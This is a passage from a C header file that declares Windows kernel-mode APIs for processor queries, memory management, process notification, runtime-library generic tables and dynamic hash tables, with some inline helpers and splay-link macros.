
NTKERNELAPI
NTSTATUS
NTAPI
KeExpandKernelStackAndCallout(
  IN PEXPAND_STACK_CALLOUT Callout,
  IN PVOID Parameter OPTIONAL,
  IN SIZE_T Size);

NTKERNELAPI
VOID
NTAPI
KeEnterGuardedRegion(VOID);

NTKERNELAPI
VOID
NTAPI
KeLeaveGuardedRegion(VOID);
#endif /* (NTDDI_VERSION >= NTDDI_WS03SP1) */

#if (NTDDI_VERSION >= NTDDI_VISTA)
#if defined(SINGLE_GROUP_LEGACY_API)

NTKERNELAPI
ULONG
NTAPI
KeQueryActiveProcessorCount(
  OUT PKAFFINITY ActiveProcessors OPTIONAL);

NTKERNELAPI
ULONG
NTAPI
KeQueryMaximumProcessorCount(VOID);
#endif /* SINGLE_GROUP_LEGACY_API */

#endif /* (NTDDI_VERSION >= NTDDI_VISTA) */

#if (NTDDI_VERSION >= NTDDI_WIN7)

NTKERNELAPI
ULONG
NTAPI
KeQueryActiveProcessorCountEx(
  IN USHORT GroupNumber);

NTKERNELAPI
ULONG
NTAPI
KeQueryMaximumProcessorCountEx(
  IN USHORT GroupNumber);

NTKERNELAPI
USHORT
NTAPI
KeQueryActiveGroupCount(VOID);

NTKERNELAPI
USHORT
NTAPI
KeQueryMaximumGroupCount(VOID);

NTKERNELAPI
KAFFINITY
NTAPI
KeQueryGroupAffinity(
  IN USHORT GroupNumber);

NTKERNELAPI
ULONG
NTAPI
KeGetCurrentProcessorNumberEx(
  OUT PPROCESSOR_NUMBER ProcNumber OPTIONAL);

NTKERNELAPI
VOID
NTAPI
KeQueryNodeActiveAffinity(
  IN USHORT NodeNumber,
  OUT PGROUP_AFFINITY Affinity OPTIONAL,
  OUT PUSHORT Count OPTIONAL);

NTKERNELAPI
USHORT
NTAPI
KeQueryNodeMaximumProcessorCount(
  IN USHORT NodeNumber);

NTKERNELAPI
USHORT
NTAPI
KeQueryHighestNodeNumber(VOID);

NTKERNELAPI
USHORT
NTAPI
KeGetCurrentNodeNumber(VOID);

NTKERNELAPI
NTSTATUS
NTAPI
KeQueryLogicalProcessorRelationship(
  IN PPROCESSOR_NUMBER ProcessorNumber OPTIONAL,
  IN LOGICAL_PROCESSOR_RELATIONSHIP RelationshipType,
  OUT PSYSTEM_LOGICAL_PROCESSOR_INFORMATION_EX Information OPTIONAL,
  IN OUT PULONG Length);

NTKERNELAPI
NTSTATUS
NTAPI
KeSetHardwareCounterConfiguration(
  IN PHARDWARE_COUNTER CounterArray,
  IN ULONG Count);

NTKERNELAPI
NTSTATUS
NTAPI
KeQueryHardwareCounterConfiguration(
  OUT PHARDWARE_COUNTER CounterArray,
  IN ULONG MaximumCount,
  OUT PULONG Count);
#endif /* (NTDDI_VERSION >= NTDDI_WIN7) */

/******************************************************************************
 *                       Memory manager Functions                             *
 ******************************************************************************/

#if (NTDDI_VERSION >= NTDDI_WIN2K)

NTKERNELAPI
PPHYSICAL_MEMORY_RANGE
NTAPI
MmGetPhysicalMemoryRanges(VOID);

NTKERNELAPI
PHYSICAL_ADDRESS
NTAPI
MmGetPhysicalAddress(
  IN PVOID BaseAddress);

NTKERNELAPI
BOOLEAN
NTAPI
MmIsNonPagedSystemAddressValid(
  IN PVOID VirtualAddress);

NTKERNELAPI
PVOID
NTAPI
MmAllocateNonCachedMemory(
  IN SIZE_T NumberOfBytes);

NTKERNELAPI
VOID
NTAPI
MmFreeNonCachedMemory(
  IN PVOID BaseAddress,
  IN SIZE_T NumberOfBytes);

NTKERNELAPI
PVOID
NTAPI
MmGetVirtualForPhysical(
  IN PHYSICAL_ADDRESS PhysicalAddress);

NTKERNELAPI
NTSTATUS
NTAPI
MmMapUserAddressesToPage(
  IN PVOID BaseAddress,
  IN SIZE_T NumberOfBytes,
  IN PVOID PageAddress);

NTKERNELAPI
PVOID
NTAPI
MmMapVideoDisplay(
  IN PHYSICAL_ADDRESS PhysicalAddress,
  IN SIZE_T NumberOfBytes,
  IN MEMORY_CACHING_TYPE CacheType);

NTKERNELAPI
NTSTATUS
NTAPI
MmMapViewInSessionSpace(
  IN PVOID Section,
  OUT PVOID *MappedBase,
  IN OUT PSIZE_T ViewSize);

NTKERNELAPI
NTSTATUS
NTAPI
MmMapViewInSystemSpace(
  IN PVOID Section,
  OUT PVOID *MappedBase,
  IN OUT PSIZE_T ViewSize);

NTKERNELAPI
BOOLEAN
NTAPI
MmIsAddressValid(
  IN PVOID VirtualAddress);

NTKERNELAPI
BOOLEAN
NTAPI
MmIsThisAnNtAsSystem(VOID);

NTKERNELAPI
VOID
NTAPI
MmLockPagableSectionByHandle(
  IN PVOID ImageSectionHandle);

NTKERNELAPI
NTSTATUS
NTAPI
MmUnmapViewInSessionSpace(
  IN PVOID MappedBase);

NTKERNELAPI
NTSTATUS
NTAPI
MmUnmapViewInSystemSpace(
  IN PVOID MappedBase);

NTKERNELAPI
VOID
NTAPI
MmUnsecureVirtualMemory(
  IN HANDLE SecureHandle);

NTKERNELAPI
NTSTATUS
NTAPI
MmRemovePhysicalMemory(
  IN PPHYSICAL_ADDRESS StartAddress,
  IN OUT PLARGE_INTEGER NumberOfBytes);

NTKERNELAPI
HANDLE
NTAPI
MmSecureVirtualMemory(
  IN PVOID Address,
  IN SIZE_T Size,
  IN ULONG ProbeMode);

NTKERNELAPI
VOID
NTAPI
MmUnmapVideoDisplay(
  IN PVOID BaseAddress,
  IN SIZE_T NumberOfBytes);

NTKERNELAPI
NTSTATUS
NTAPI
MmAddPhysicalMemory(
  IN PPHYSICAL_ADDRESS StartAddress,
  IN OUT PLARGE_INTEGER NumberOfBytes);

NTKERNELAPI
PVOID
NTAPI
MmAllocateContiguousMemory(
  IN SIZE_T NumberOfBytes,
  IN PHYSICAL_ADDRESS HighestAcceptableAddress);

NTKERNELAPI
PVOID
NTAPI
MmAllocateContiguousMemorySpecifyCache(
  IN SIZE_T NumberOfBytes,
  IN PHYSICAL_ADDRESS LowestAcceptableAddress,
  IN PHYSICAL_ADDRESS HighestAcceptableAddress,
  IN PHYSICAL_ADDRESS BoundaryAddressMultiple OPTIONAL,
  IN MEMORY_CACHING_TYPE CacheType);

NTKERNELAPI
PVOID
NTAPI
MmAllocateContiguousMemorySpecifyCacheNode(
  IN SIZE_T NumberOfBytes,
  IN PHYSICAL_ADDRESS LowestAcceptableAddress,
  IN PHYSICAL_ADDRESS HighestAcceptableAddress,
  IN PHYSICAL_ADDRESS BoundaryAddressMultiple OPTIONAL,
  IN MEMORY_CACHING_TYPE CacheType,
  IN NODE_REQUIREMENT PreferredNode);

NTKERNELAPI
VOID
NTAPI
MmFreeContiguousMemory(
  IN PVOID BaseAddress);

NTKERNELAPI
VOID
NTAPI
MmFreeContiguousMemorySpecifyCache(
  IN PVOID BaseAddress,
  IN SIZE_T NumberOfBytes,
  IN MEMORY_CACHING_TYPE CacheType);

#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */



#if (NTDDI_VERSION >= NTDDI_WS03)

NTKERNELAPI
NTSTATUS
NTAPI
MmCreateMirror(VOID);
#endif /* (NTDDI_VERSION >= NTDDI_WS03) */

#if (NTDDI_VERSION >= NTDDI_VISTA)
NTSTATUS
NTAPI
MmRotatePhysicalView(
  IN PVOID VirtualAddress,
  IN OUT PSIZE_T NumberOfBytes,
  IN PMDLX NewMdl OPTIONAL,
  IN MM_ROTATE_DIRECTION Direction,
  IN PMM_ROTATE_COPY_CALLBACK_FUNCTION CopyFunction,
  IN PVOID Context OPTIONAL);
#endif /* (NTDDI_VERSION >= NTDDI_VISTA) */

/******************************************************************************
 *                          Process Manager Functions                         *
 ******************************************************************************/

NTSYSCALLAPI
NTSTATUS
NTAPI
NtOpenProcess(
  OUT PHANDLE ProcessHandle,
  IN ACCESS_MASK DesiredAccess,
  IN POBJECT_ATTRIBUTES ObjectAttributes,
  IN PCLIENT_ID ClientId OPTIONAL);

NTSYSCALLAPI
NTSTATUS
NTAPI
NtQueryInformationProcess(
  IN HANDLE ProcessHandle,
  IN PROCESSINFOCLASS ProcessInformationClass,
  OUT PVOID ProcessInformation OPTIONAL,
  IN ULONG ProcessInformationLength,
  OUT PULONG ReturnLength OPTIONAL);

#if (NTDDI_VERSION >= NTDDI_WIN2K)


NTKERNELAPI
NTSTATUS
NTAPI
PsSetCreateProcessNotifyRoutine(
  IN PCREATE_PROCESS_NOTIFY_ROUTINE NotifyRoutine,
  IN BOOLEAN Remove);

NTKERNELAPI
NTSTATUS
NTAPI
PsSetCreateThreadNotifyRoutine(
  IN PCREATE_THREAD_NOTIFY_ROUTINE NotifyRoutine);

NTKERNELAPI
NTSTATUS
NTAPI
PsSetLoadImageNotifyRoutine(
  IN PLOAD_IMAGE_NOTIFY_ROUTINE NotifyRoutine);

NTKERNELAPI
HANDLE
NTAPI
PsGetCurrentProcessId(VOID);

NTKERNELAPI
HANDLE
NTAPI
PsGetCurrentThreadId(VOID);

NTKERNELAPI
BOOLEAN
NTAPI
PsGetVersion(
  OUT PULONG MajorVersion OPTIONAL,
  OUT PULONG MinorVersion OPTIONAL,
  OUT PULONG BuildNumber OPTIONAL,
  OUT PUNICODE_STRING CSDVersion OPTIONAL);
#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */
#if (NTDDI_VERSION >= NTDDI_WINXP)

NTKERNELAPI
HANDLE
NTAPI
PsGetProcessId(
  IN PEPROCESS Process);

NTKERNELAPI
HANDLE
NTAPI
PsGetThreadId(
  IN PETHREAD Thread);

NTKERNELAPI
NTSTATUS
NTAPI
PsRemoveCreateThreadNotifyRoutine(
  IN PCREATE_THREAD_NOTIFY_ROUTINE NotifyRoutine);

NTKERNELAPI
NTSTATUS
NTAPI
PsRemoveLoadImageNotifyRoutine(
  IN PLOAD_IMAGE_NOTIFY_ROUTINE NotifyRoutine);

NTKERNELAPI
LONGLONG
NTAPI
PsGetProcessCreateTimeQuadPart(
  IN PEPROCESS Process);
#endif /* (NTDDI_VERSION >= NTDDI_WINXP) */

#if (NTDDI_VERSION >= NTDDI_WS03)
NTKERNELAPI
HANDLE
NTAPI
PsGetThreadProcessId(
  IN PETHREAD Thread);
#endif /* (NTDDI_VERSION >= NTDDI_WS03) */

#if (NTDDI_VERSION >= NTDDI_VISTA)

NTKERNELAPI
BOOLEAN
NTAPI
PsSetCurrentThreadPrefetching(
  IN BOOLEAN Prefetching);

NTKERNELAPI
BOOLEAN
NTAPI
PsIsCurrentThreadPrefetching(VOID);

#endif /* (NTDDI_VERSION >= NTDDI_VISTA) */

#if (NTDDI_VERSION >= NTDDI_VISTASP1)
NTKERNELAPI
NTSTATUS
NTAPI
PsSetCreateProcessNotifyRoutineEx(
  IN PCREATE_PROCESS_NOTIFY_ROUTINE_EX NotifyRoutine,
  IN BOOLEAN Remove);
#endif /* (NTDDI_VERSION >= NTDDI_VISTASP1) */


/******************************************************************************
 *                         Runtime Library Functions                          *
 ******************************************************************************/


#if (NTDDI_VERSION >= NTDDI_WIN2K)


#ifndef RTL_USE_AVL_TABLES

NTSYSAPI
VOID
NTAPI
RtlInitializeGenericTable(
  OUT PRTL_GENERIC_TABLE Table,
  IN PRTL_GENERIC_COMPARE_ROUTINE CompareRoutine,
  IN PRTL_GENERIC_ALLOCATE_ROUTINE AllocateRoutine,
  IN PRTL_GENERIC_FREE_ROUTINE FreeRoutine,
  IN PVOID TableContext OPTIONAL);

NTSYSAPI
PVOID
NTAPI
RtlInsertElementGenericTable(
  IN PRTL_GENERIC_TABLE Table,
  IN PVOID Buffer,
  IN CLONG BufferSize,
  OUT PBOOLEAN NewElement OPTIONAL);

NTSYSAPI
PVOID
NTAPI
RtlInsertElementGenericTableFull(
  IN PRTL_GENERIC_TABLE Table,
  IN PVOID Buffer,
  IN CLONG BufferSize,
  OUT PBOOLEAN NewElement OPTIONAL,
  IN PVOID NodeOrParent,
  IN TABLE_SEARCH_RESULT SearchResult);

NTSYSAPI
BOOLEAN
NTAPI
RtlDeleteElementGenericTable(
  IN PRTL_GENERIC_TABLE Table,
  IN PVOID Buffer);

NTSYSAPI
PVOID
NTAPI
RtlLookupElementGenericTable(
  IN PRTL_GENERIC_TABLE Table,
  IN PVOID Buffer);

NTSYSAPI
PVOID
NTAPI
RtlLookupElementGenericTableFull(
  IN PRTL_GENERIC_TABLE Table,
  IN PVOID Buffer,
  OUT PVOID *NodeOrParent,
  OUT TABLE_SEARCH_RESULT *SearchResult);

NTSYSAPI
PVOID
NTAPI
RtlEnumerateGenericTable(
  IN PRTL_GENERIC_TABLE Table,
  IN BOOLEAN Restart);

NTSYSAPI
PVOID
NTAPI
RtlEnumerateGenericTableWithoutSplaying(
  IN PRTL_GENERIC_TABLE Table,
  IN OUT PVOID *RestartKey);

NTSYSAPI
PVOID
NTAPI
RtlGetElementGenericTable(
  IN PRTL_GENERIC_TABLE Table,
  IN ULONG I);

NTSYSAPI
ULONG
NTAPI
RtlNumberGenericTableElements(
  IN PRTL_GENERIC_TABLE Table);

NTSYSAPI
BOOLEAN
NTAPI
RtlIsGenericTableEmpty(
  IN PRTL_GENERIC_TABLE Table);

#endif /* !RTL_USE_AVL_TABLES */

#define RTL_STACK_WALKING_MODE_FRAMES_TO_SKIP_SHIFT     8

NTSYSAPI
PRTL_SPLAY_LINKS
NTAPI
RtlSplay(
  IN OUT PRTL_SPLAY_LINKS Links);

NTSYSAPI
PRTL_SPLAY_LINKS
NTAPI
RtlDelete(
  IN PRTL_SPLAY_LINKS Links);

NTSYSAPI
VOID
NTAPI
RtlDeleteNoSplay(
  IN PRTL_SPLAY_LINKS Links,
  IN OUT PRTL_SPLAY_LINKS *Root);

NTSYSAPI
PRTL_SPLAY_LINKS
NTAPI
RtlSubtreeSuccessor(
  IN PRTL_SPLAY_LINKS Links);

NTSYSAPI
PRTL_SPLAY_LINKS
NTAPI
RtlSubtreePredecessor(
  IN PRTL_SPLAY_LINKS Links);

NTSYSAPI
PRTL_SPLAY_LINKS
NTAPI
RtlRealSuccessor(
  IN PRTL_SPLAY_LINKS Links);

NTSYSAPI
PRTL_SPLAY_LINKS
NTAPI
RtlRealPredecessor(
  IN PRTL_SPLAY_LINKS Links);

NTSYSAPI
BOOLEAN
NTAPI
RtlPrefixUnicodeString(
  IN PCUNICODE_STRING  String1,
  IN PCUNICODE_STRING  String2,
  IN BOOLEAN  CaseInSensitive);

NTSYSAPI
VOID
NTAPI
RtlUpperString(
  IN OUT PSTRING  DestinationString,
  IN const PSTRING  SourceString);

NTSYSAPI
NTSTATUS
NTAPI
RtlUpcaseUnicodeString(
  IN OUT PUNICODE_STRING DestinationString,
  IN PCUNICODE_STRING  SourceString,
  IN BOOLEAN  AllocateDestinationString);

NTSYSAPI
VOID
NTAPI
RtlMapGenericMask(
  IN OUT PACCESS_MASK AccessMask,
  IN PGENERIC_MAPPING GenericMapping);

NTSYSAPI
NTSTATUS
NTAPI
RtlVolumeDeviceToDosName(
  IN PVOID VolumeDeviceObject,
  OUT PUNICODE_STRING DosName);

NTSYSAPI
NTSTATUS
NTAPI
RtlGetVersion(
  IN OUT PRTL_OSVERSIONINFOW lpVersionInformation);

NTSYSAPI
NTSTATUS
NTAPI
RtlVerifyVersionInfo(
  IN PRTL_OSVERSIONINFOEXW VersionInfo,
  IN ULONG TypeMask,
  IN ULONGLONG ConditionMask);

NTSYSAPI
LONG
NTAPI
RtlCompareString(
  IN const PSTRING String1,
  IN const PSTRING String2,
  IN BOOLEAN CaseInSensitive);

NTSYSAPI
VOID
NTAPI
RtlCopyString(
  OUT PSTRING DestinationString,
  IN const PSTRING SourceString OPTIONAL);

NTSYSAPI
BOOLEAN
NTAPI
RtlEqualString(
  IN const PSTRING String1,
  IN const PSTRING String2,
  IN BOOLEAN CaseInSensitive);

NTSYSAPI
NTSTATUS
NTAPI
RtlCharToInteger(
  IN PCSZ String,
  IN ULONG Base OPTIONAL,
  OUT PULONG Value);

NTSYSAPI
CHAR
NTAPI
RtlUpperChar(
  IN CHAR Character);

NTSYSAPI
ULONG
NTAPI
RtlWalkFrameChain(
  OUT PVOID *Callers,
  IN ULONG Count,
  IN ULONG Flags);


#endif /* (NTDDI_VERSION >= NTDDI_WIN2K) */


#if (NTDDI_VERSION >= NTDDI_WINXP)



NTSYSAPI
VOID
NTAPI
RtlInitializeGenericTableAvl(
  OUT PRTL_AVL_TABLE Table,
  IN PRTL_AVL_COMPARE_ROUTINE CompareRoutine,
  IN PRTL_AVL_ALLOCATE_ROUTINE AllocateRoutine,
  IN PRTL_AVL_FREE_ROUTINE FreeRoutine,
  IN PVOID TableContext OPTIONAL);

NTSYSAPI
PVOID
NTAPI
RtlInsertElementGenericTableAvl(
  IN PRTL_AVL_TABLE Table,
  IN PVOID Buffer,
  IN CLONG BufferSize,
  OUT PBOOLEAN NewElement OPTIONAL);

NTSYSAPI
PVOID
NTAPI
RtlInsertElementGenericTableFullAvl(
  IN PRTL_AVL_TABLE Table,
  IN PVOID Buffer,
  IN CLONG BufferSize,
  OUT PBOOLEAN NewElement OPTIONAL,
  IN PVOID NodeOrParent,
  IN TABLE_SEARCH_RESULT SearchResult);

NTSYSAPI
BOOLEAN
NTAPI
RtlDeleteElementGenericTableAvl(
  IN PRTL_AVL_TABLE Table,
  IN PVOID Buffer);

NTSYSAPI
PVOID
NTAPI
RtlLookupElementGenericTableAvl(
  IN PRTL_AVL_TABLE Table,
  IN PVOID Buffer);

NTSYSAPI
PVOID
NTAPI
RtlLookupElementGenericTableFullAvl(
  IN PRTL_AVL_TABLE Table,
  IN PVOID Buffer,
  OUT PVOID *NodeOrParent,
  OUT TABLE_SEARCH_RESULT *SearchResult);

NTSYSAPI
PVOID
NTAPI
RtlEnumerateGenericTableAvl(
  IN PRTL_AVL_TABLE Table,
  IN BOOLEAN Restart);

NTSYSAPI
PVOID
NTAPI
RtlEnumerateGenericTableWithoutSplayingAvl(
  IN PRTL_AVL_TABLE Table,
  IN OUT PVOID *RestartKey);

NTSYSAPI
PVOID
NTAPI
RtlLookupFirstMatchingElementGenericTableAvl(
  IN PRTL_AVL_TABLE Table,
  IN PVOID Buffer,
  OUT PVOID *RestartKey);

NTSYSAPI
PVOID
NTAPI
RtlEnumerateGenericTableLikeADirectory(
  IN PRTL_AVL_TABLE Table,
  IN PRTL_AVL_MATCH_FUNCTION MatchFunction OPTIONAL,
  IN PVOID MatchData OPTIONAL,
  IN ULONG NextFlag,
  IN OUT PVOID *RestartKey,
  IN OUT PULONG DeleteCount,
  IN PVOID Buffer);

NTSYSAPI
PVOID
NTAPI
RtlGetElementGenericTableAvl(
  IN PRTL_AVL_TABLE Table,
  IN ULONG I);

NTSYSAPI
ULONG
NTAPI
RtlNumberGenericTableElementsAvl(
  IN PRTL_AVL_TABLE Table);

NTSYSAPI
BOOLEAN
NTAPI
RtlIsGenericTableEmptyAvl(
  IN PRTL_AVL_TABLE Table);


#endif /* (NTDDI_VERSION >= NTDDI_WINXP) */


#if (NTDDI_VERSION >= NTDDI_VISTA)


NTSYSAPI
VOID
NTAPI
RtlRunOnceInitialize(
  OUT PRTL_RUN_ONCE RunOnce);

NTSYSAPI
NTSTATUS
NTAPI
RtlRunOnceExecuteOnce(
  IN OUT PRTL_RUN_ONCE RunOnce,
  IN PRTL_RUN_ONCE_INIT_FN InitFn,
  IN OUT PVOID Parameter OPTIONAL,
  OUT PVOID *Context OPTIONAL);

NTSYSAPI
NTSTATUS
NTAPI
RtlRunOnceBeginInitialize(
  IN OUT PRTL_RUN_ONCE RunOnce,
  IN ULONG Flags,
  OUT PVOID *Context OPTIONAL);

NTSYSAPI
NTSTATUS
NTAPI
RtlRunOnceComplete(
  IN OUT PRTL_RUN_ONCE RunOnce,
  IN ULONG Flags,
  IN PVOID Context OPTIONAL);

NTSYSAPI
BOOLEAN
NTAPI
RtlGetProductInfo(
  IN ULONG OSMajorVersion,
  IN ULONG OSMinorVersion,
  IN ULONG SpMajorVersion,
  IN ULONG SpMinorVersion,
  OUT PULONG ReturnedProductType);


#endif /* (NTDDI_VERSION >= NTDDI_VISTA) */

#if (NTDDI_VERSION >= NTDDI_WIN7)


NTSYSAPI
BOOLEAN
NTAPI
RtlCreateHashTable(
  IN OUT PRTL_DYNAMIC_HASH_TABLE *HashTable OPTIONAL,
  IN ULONG Shift,
  IN ULONG Flags);

NTSYSAPI
VOID
NTAPI
RtlDeleteHashTable(
  IN PRTL_DYNAMIC_HASH_TABLE HashTable);

NTSYSAPI
BOOLEAN
NTAPI
RtlInsertEntryHashTable(
  IN PRTL_DYNAMIC_HASH_TABLE HashTable,
  IN PRTL_DYNAMIC_HASH_TABLE_ENTRY Entry,
  IN ULONG_PTR Signature,
  IN OUT PRTL_DYNAMIC_HASH_TABLE_CONTEXT Context OPTIONAL);

NTSYSAPI
BOOLEAN
NTAPI
RtlRemoveEntryHashTable(
  IN PRTL_DYNAMIC_HASH_TABLE HashTable,
  IN PRTL_DYNAMIC_HASH_TABLE_ENTRY Entry,
  IN OUT PRTL_DYNAMIC_HASH_TABLE_CONTEXT Context OPTIONAL);

NTSYSAPI
PRTL_DYNAMIC_HASH_TABLE_ENTRY
NTAPI
RtlLookupEntryHashTable(
  IN PRTL_DYNAMIC_HASH_TABLE HashTable,
  IN ULONG_PTR Signature,
  OUT PRTL_DYNAMIC_HASH_TABLE_CONTEXT Context OPTIONAL);

NTSYSAPI
PRTL_DYNAMIC_HASH_TABLE_ENTRY
NTAPI
RtlGetNextEntryHashTable(
  IN PRTL_DYNAMIC_HASH_TABLE HashTable,
  IN PRTL_DYNAMIC_HASH_TABLE_CONTEXT Context);

NTSYSAPI
BOOLEAN
NTAPI
RtlInitEnumerationHashTable(
  IN PRTL_DYNAMIC_HASH_TABLE HashTable,
  OUT PRTL_DYNAMIC_HASH_TABLE_ENUMERATOR Enumerator);

NTSYSAPI
PRTL_DYNAMIC_HASH_TABLE_ENTRY
NTAPI
RtlEnumerateEntryHashTable(
  IN PRTL_DYNAMIC_HASH_TABLE HashTable,
  IN OUT PRTL_DYNAMIC_HASH_TABLE_ENUMERATOR Enumerator);

NTSYSAPI
VOID
NTAPI
RtlEndEnumerationHashTable(
  IN PRTL_DYNAMIC_HASH_TABLE HashTable,
  IN OUT PRTL_DYNAMIC_HASH_TABLE_ENUMERATOR Enumerator);

NTSYSAPI
BOOLEAN
NTAPI
RtlInitWeakEnumerationHashTable(
  IN PRTL_DYNAMIC_HASH_TABLE HashTable,
  OUT PRTL_DYNAMIC_HASH_TABLE_ENUMERATOR Enumerator);

NTSYSAPI
PRTL_DYNAMIC_HASH_TABLE_ENTRY
NTAPI
RtlWeaklyEnumerateEntryHashTable(
  IN PRTL_DYNAMIC_HASH_TABLE HashTable,
  IN OUT PRTL_DYNAMIC_HASH_TABLE_ENUMERATOR Enumerator);

NTSYSAPI
VOID
NTAPI
RtlEndWeakEnumerationHashTable(
  IN PRTL_DYNAMIC_HASH_TABLE HashTable,
  IN OUT PRTL_DYNAMIC_HASH_TABLE_ENUMERATOR Enumerator);

NTSYSAPI
BOOLEAN
NTAPI
RtlExpandHashTable(
  IN PRTL_DYNAMIC_HASH_TABLE HashTable);

NTSYSAPI
BOOLEAN
NTAPI
RtlContractHashTable(
  IN PRTL_DYNAMIC_HASH_TABLE HashTable);


#endif /* (NTDDI_VERSION >= NTDDI_WIN7) */


#if defined(_AMD64_) || defined(_IA64_)



//DECLSPEC_DEPRECATED_DDK_WINXP
FORCEINLINE
LARGE_INTEGER
NTAPI_INLINE
RtlLargeIntegerDivide(
  IN LARGE_INTEGER Dividend,
  IN LARGE_INTEGER Divisor,
  OUT PLARGE_INTEGER Remainder OPTIONAL)
{
  LARGE_INTEGER ret;
  ret.QuadPart = Dividend.QuadPart / Divisor.QuadPart;
  if (Remainder)
    Remainder->QuadPart = Dividend.QuadPart % Divisor.QuadPart;
  return ret;
}

#else

#if (NTDDI_VERSION >= NTDDI_WIN2K)
NTSYSAPI
LARGE_INTEGER
NTAPI
RtlLargeIntegerDivide(
  IN LARGE_INTEGER Dividend,
  IN LARGE_INTEGER Divisor,
  OUT PLARGE_INTEGER Remainder OPTIONAL);
#endif


#endif /* defined(_AMD64_) || defined(_IA64_) */



#ifdef RTL_USE_AVL_TABLES

#define RtlInitializeGenericTable               RtlInitializeGenericTableAvl
#define RtlInsertElementGenericTable            RtlInsertElementGenericTableAvl
#define RtlInsertElementGenericTableFull        RtlInsertElementGenericTableFullAvl
#define RtlDeleteElementGenericTable            RtlDeleteElementGenericTableAvl
#define RtlLookupElementGenericTable            RtlLookupElementGenericTableAvl
#define RtlLookupElementGenericTableFull        RtlLookupElementGenericTableFullAvl
#define RtlEnumerateGenericTable                RtlEnumerateGenericTableAvl
#define RtlEnumerateGenericTableWithoutSplaying RtlEnumerateGenericTableWithoutSplayingAvl
#define RtlGetElementGenericTable               RtlGetElementGenericTableAvl
#define RtlNumberGenericTableElements           RtlNumberGenericTableElementsAvl
#define RtlIsGenericTableEmpty                  RtlIsGenericTableEmptyAvl

#endif /* RTL_USE_AVL_TABLES */

#define RtlInitializeSplayLinks(Links) {    \
  PRTL_SPLAY_LINKS _SplayLinks;            \
  _SplayLinks = (PRTL_SPLAY_LINKS)(Links); \
  _SplayLinks->Parent = _SplayLinks;   \
  _SplayLinks->LeftChild = NULL;       \
  _SplayLinks->RightChild = NULL;      \
}

#define RtlIsLeftChild(Links) \
    (RtlLeftChild(RtlParent(Links)) == (PRTL_SPLAY_LINKS)(Links))

#define RtlIsRightChild(Links) \
    (RtlRightChild(RtlParent(Links)) == (PRTL_SPLAY_LINKS)(Links))

#define RtlRightChild(Links) \
    ((PRTL_SPLAY_LINKS)(Links))->RightChild

#define RtlIsRoot(Links) \
    (RtlParent(Links) == (PRTL_SPLAY_LINKS)(Links))

#define RtlLeftChild(Links) \
    ((PRTL_SPLAY_LINKS)(Links))->LeftChild

#define RtlParent(Links) \
    ((PRTL_SPLAY_LINKS)(Links))->Parent

#define RtlInsertAsLeftChild(ParentLinks,ChildLinks)    \
    {                                                   \
        PRTL_SPLAY_LINKS _SplayParent;                  \
        PRTL_SPLAY_LINKS _SplayChild;                   \
        _SplayParent = (PRTL_SPLAY_LINKS)(ParentLinks); \
        _SplayChild = (PRTL_SPLAY_LINKS)(ChildLinks);   \
        _SplayParent->LeftChild = _SplayChild;          \
        _SplayChild->Parent = _SplayParent;             \
    }

#define RtlInsertAsRightChild(ParentLinks,ChildLinks)   \
    {                                                   \
        PRTL_SPLAY_LINKS _SplayParent;                  \
        PRTL_SPLAY_LINKS _SplayChild;                   \
        _SplayParent = (PRTL_SPLAY_LINKS)(ParentLinks); \
        _SplayChild = (PRTL_SPLAY_LINKS)(ChildLinks);   \
        _SplayParent->RightChild = _SplayChild;         \
        _SplayChild->Parent = _SplayParent;             \
    }

#if !defined(MIDL_PASS)

FORCEINLINE
LUID
NTAPI_INLINE
RtlConvertLongToLuid(
  IN LONG Val)
{
  LUID Luid;
  LARGE_INTEGER Temp;

  Temp.QuadPart = Val;
  Luid.LowPart = Temp.u.LowPart;
  Luid.HighPart = Temp.u.HighPart;
  return Luid;
}

FORCEINLINE
LUID
NTAPI_INLINE
RtlConvertUlongToLuid(
  IN ULONG Val)
{
  LUID Luid;

  Luid.LowPart = Val;
  Luid.HighPart = 0;
  return Luid;
}

#endif /* !defined(MIDL_PASS) */

#if (defined(_M_AMD64) || defined(_M_IA64)) && !defined(_REALLY_GET_CALLERS_CALLER_)
#define RtlGetCallersAddress(CallersAddress, CallersCaller) \
    *CallersAddress = (PVOID)_ReturnAddress(); \
    *CallersCaller = NULL;
#else
#if (NTDDI_VERSION >= NTDDI_WIN2K)
NTSYSAPI
VOID
NTAPI
RtlGetCallersAddress(
  OUT PVOID *CallersAddress,
  OUT PVOID *CallersCaller);
#endif
#endif

#if !defined(MIDL_PASS) && !defined(SORTPP_PASS)

#if (NTDDI_VERSION >= NTDDI_WIN7)

FORCEINLINE
VOID
NTAPI
RtlInitHashTableContext(
  IN OUT PRTL_DYNAMIC_HASH_TABLE_CONTEXT Context)
{
  Context->ChainHead = NULL;
  Context->PrevLinkage = NULL;
}

FORCEINLINE
VOID
NTAPI
RtlInitHashTableContextFromEnumerator(
  IN OUT PRTL_DYNAMIC_HASH_TABLE_CONTEXT Context,
  IN PRTL_DYNAMIC_HASH_TABLE_ENUMERATOR Enumerator)
{
  Context->ChainHead = Enumerator->ChainHead;
  Context->PrevLinkage = Enumerator->HashEntry.Linkage.Blink;
}

FORCEINLINE
VOID
NTAPI
RtlReleaseHashTableContext(
  IN OUT PRTL_DYNAMIC_HASH_TABLE_CONTEXT Context)
{
  UNREFERENCED_PARAMETER(Context);
  return;
}

FORCEINLINE
ULONG
NTAPI
RtlTotalBucketsHashTable(
  IN PRTL_DYNAMIC_HASH_TABLE HashTable)
{
  return HashTable->TableSize;
}

FORCEINLINE
ULONG
NTAPI
RtlNonEmptyBucketsHashTable(
  IN PRTL_DYNAMIC_HASH_TABLE HashTable)
{
  return HashTable->NonEmptyBuckets;
}

FORCEINLINE
ULONG
NTAPI
RtlEmptyBucketsHashTable(
  IN PRTL_DYNAMIC_HASH_TABLE HashTable)
{
  return HashTable->TableSize - HashTable->NonEmptyBuckets;
}

FORCEINLINE
ULONG
NTAPI
RtlTotalEntriesHashTable(
  IN PRTL_DYNAMIC_HASH_TABLE HashTable)
{
  return HashTable->NumEntries;
}

FORCEINLINE
ULONG
NTAPI
RtlActiveEnumeratorsHashTable(
  IN PRTL_DYNAMIC_HASH_TABLE HashTable)
{
  return HashTable->NumEnumerators;
}

#endif /* (NTDDI_VERSION >= NTDDI_WIN7) */

#endif /* !defined(MIDL_PASS) && !defined(SORTPP_PASS) */

/******************************************************************************
 *                            Security Manager Functions                      *
 ******************************************************************************/

#if (NTDDI_VERSION >= NTDDI_WIN2K)

NTKERNELAPI
